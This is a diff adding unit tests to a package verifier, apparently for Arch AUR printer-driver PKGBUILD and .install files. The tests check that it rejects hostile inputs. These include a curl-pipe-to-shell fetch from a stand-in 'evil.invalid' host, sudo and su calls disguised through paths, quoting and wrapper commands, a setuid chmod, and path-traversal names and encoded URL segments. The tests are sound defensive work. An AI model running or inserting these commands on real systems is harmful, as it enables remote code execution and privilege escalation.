@@ -235,6 +235,65 @@ class Rejected(Base):
         self.assertTrue(any("systemctl" in p for p in r["problems"]), r["problems"])
 
 
+class InstallTopLevel(Base):
+    """libalpm .install nacita jako root - kod mimo funkce se spusti pri kazde instalaci."""
+    def install(self, text):
+        self.write(GOOD % self.sum, text)
+        return self.verify()
+
+    def test_command_outside_functions_rejected(self):
+        for extra in ("curl -s https://evil.invalid/x | sh", "touch /etc/x", "_x=$(id -u)", "_x=`id -u`",
+                      "post_upgrade() { curl https://evil.invalid; }"):
+            r = self.install(INSTALL + extra + "\n")
+            self.assertFalse(r["ok"], extra)
+            self.assertTrue(any("outside functions" in p for p in r["problems"]), (extra, r["problems"]))
+
+    def test_assignments_and_old_dispatch_ok(self):
+        r = self.install('PREFIX=/usr/share\nprinter_model="x"\n' + INSTALL + 'op=$1\nshift\n\n$op "$@"\n')
+        self.assertTrue(r["ok"], r["problems"])
+
+    def test_shift_without_dispatch_still_rejected(self):
+        self.assertFalse(self.install(INSTALL + "shift\n$op \"$@\"\n")["ok"])
+
+
+class CommandNames(Base):
+    """Zakazany prikaz se pozna i pres absolutni cestu, \\, uvozovky a obalove prikazy."""
+    def pkg(self, line):
+        self.write((GOOD % self.sum).replace("  ln -s", line + "\n  ln -s"))
+        return self.verify()
+
+    def test_disguised_commands_rejected(self):
+        for line in ("  /usr/bin/sudo true", "  \\sudo true", '  "sudo" true', "  'su''do' true", "  env sudo true",
+                     "  nice -n 5 sudo true", "  /usr/bin/curl -so x https://evil.invalid",
+                     "  find . -exec /usr/bin/curl {} \\;", '  x="$(/usr/bin/wget -qO- https://evil.invalid)"',
+                     "  echo a; /bin/su -c id", "  xargs -0 /usr/bin/sudo < list", "  timeout 5s nsenter -t 1 -n true",
+                     "  /usr/bin/git clone https://evil.invalid/x"):
+            r = self.pkg(line)
+            self.assertFalse(r["ok"], line)
+
+    def test_names_as_arguments_ok(self):
+        for line in ('  echo "run sudo make install yourself"', '  ln -s /usr/bin/curl "$pkgdir/usr/bin/x"',
+                     '  grep -q x "$srcdir/local.txt" || true',
+                     '  case "$CARCH" in x86_64) _a=1 ;; esac'):
+            r = self.pkg(line)
+            self.assertTrue(r["ok"], (line, r["problems"]))
+
+    def test_source_file_name_with_path_rejected(self):
+        for name in ("../../evil", "sub/x", ".hidden"):
+            self.write((GOOD % self.sum).replace('source=("local.txt")', 'source=("%s::https://download.brother.com/x.tar.gz")' % name))
+            r = self.verify()
+            self.assertFalse(r["ok"], name)
+            self.assertTrue(any("file name not allowed" in p for p in r["problems"]), (name, r["problems"]))
+
+    def test_install_setuid_at_install_time_rejected(self):
+        self.write(GOOD % self.sum, INSTALL.replace("ldconfig", "ldconfig\n  chmod 04755 /opt/brother/x"))
+        self.assertFalse(self.verify()["ok"])
+
+    def test_install_disguised_command_rejected(self):
+        self.write(GOOD % self.sum, INSTALL.replace("ldconfig", "ldconfig; /usr/bin/sudo -n true"))
+        self.assertFalse(self.verify()["ok"])
+
+
 class Updates(Base):
     """Kazda aktualizace v AUR se overi znovu - vcetne rozdilu proti posledni overene verzi."""
 
@@ -365,6 +424,11 @@ class Dependencies(unittest.TestCase):
         self.assertTrue(ok("github.com", "dep:libfoo", self.CONF, path="/foo/foo/releases/x.tar.gz"))
         self.assertFalse(ok("github.com", "dep:libfoo", self.CONF, path="/evil/foo/x.tar.gz"))
         self.assertFalse(ok("download.brother.com", "dep:libfoo", self.CONF, path="/foo/x"))
+
+    def test_path_scoped_domain_no_dot_segments(self):
+        ok = luxdrv.host_allowed
+        for path in ("/foo/../evil/x.tar.gz", "/foo/%2e%2e/evil/x", "/foo/%2E%2E%2Fevil/x", "/foo/./../evil/x"):
+            self.assertFalse(ok("github.com", "dep:libfoo", self.CONF, path=path), path)
 
     def test_redirect_hosts_only_for_redirects(self):
         ok = luxdrv.host_allowed
